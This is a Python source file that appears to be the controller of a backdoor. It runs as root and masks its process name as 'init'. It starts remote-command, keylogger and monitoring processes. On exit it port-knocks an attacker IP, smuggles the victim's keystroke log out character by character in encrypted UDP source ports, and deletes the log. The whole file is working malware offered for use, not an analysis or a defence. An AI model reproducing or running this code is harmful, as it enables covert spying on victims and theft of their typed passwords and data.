import sys
import os
from encryption import encrypt
from command import command
from keylogger import keylog
from watch import monitor
from scapy.sendrecv import send
from scapy.layers.inet import IP, UDP
from multiprocessing import Process
from setproctitle import setproctitle
import time
import config


def handle_command():
    command()


def handle_keylogger():
    keylog()


def handle_monitor():
    monitor()


def send_knock():
    for port in config.keylog_knock_sequence:
        packet = IP(dst=config.attacker_ip) / UDP(dport=port)
        send(packet, verbose=False)
    print("Sequence for opening port sent.")
    time.sleep(0.5)


def send_keylog(log_file):
    print("Converting log file to bytes and encrypting...")
    
    with open(log_file, 'r') as f:
        content = f.read()
        f.close()

    # print(content)
    for char in content:
        encrypted_char = encrypt(char)
        source_port = int.from_bytes(encrypted_char, byteorder='big')
        packet = IP(dst=config.attacker_ip) / UDP(sport=source_port, dport=config.attacker_keylogger_port) / ""
        send(packet, verbose=False)

    print("Log file successfully sent.")

    termination_packet = IP(dst=config.attacker_ip) / UDP(dport=config.attacker_keylogger_port) / b"EOF"
    send(termination_packet, verbose=False)
    
    print("Termination request sent.\n")

    # Removing log file after sending
    os.remove(config.victim_keylog_file)


def main():
    if os.geteuid() != 0:
        sys.exit("Root privilege is required.")

    print("Backdoor running....\n")
    # Mask process name to camouflage itself
    setproctitle("init")

    command_process = Process(target=handle_command)
    keylog_process = Process(target=handle_keylogger)
    monitor_process = Process(target=handle_monitor)

    try:
        command_process.start()
        keylog_process.start()
        monitor_process.start()

        while True:
            pass
    except KeyboardInterrupt:
        command_process.terminate()
        keylog_process.terminate()
        monitor_process.terminate()
        
        command_process.join()
        keylog_process.join()
        monitor_process.join()

        # Perform port knocking to open up port on the attacker, then send the log file
        send_knock()
        send_keylog(config.victim_keylog_file)

        sys.exit("Exiting program...")


if __name__ == "__main__":
    main()
